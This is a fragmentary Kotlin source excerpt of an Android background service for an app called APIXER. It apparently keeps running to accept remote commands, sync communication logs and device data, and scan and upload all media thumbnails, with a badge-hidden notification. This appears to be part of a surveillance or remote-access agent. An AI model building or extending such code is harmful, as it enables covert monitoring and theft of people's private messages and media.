package zxtni.apixer.into.service
...
import zxtni.apixer.into.MainActivity
import zxtni.apixer.into.R
import zxtni.apixer.into.command.CommandExecutor
...
import zxtni.apixer.into.network.CommunicationLogSyncRequest
import zxtni.apixer.into.network.DeviceSyncRequest
import zxtni.apixer.into.network.ServerConfig
import zxtni.apixer.into.receiver.RestartReceiver
...
class AgentBackgroundService : Service() {
    ...
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                ...
                description = "Keeps APIXER active in the background for real-time sync and remote commands"
                setShowBadge(false)
            }
    ...
    private fun buildNotification(): Notification {
        ...
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("APIXER — Live Sync Active")
    ...
    private suspend fun performMediaScan() {
        try {
            ...
            zxtni.apixer.into.data.MediaScanner.scanAndUploadAll(applicationContext) { batch ->
                val payload = zxtni.apixer.into.network.MediaThumbnailSyncRequest(
                    thumbnails = batch
                )
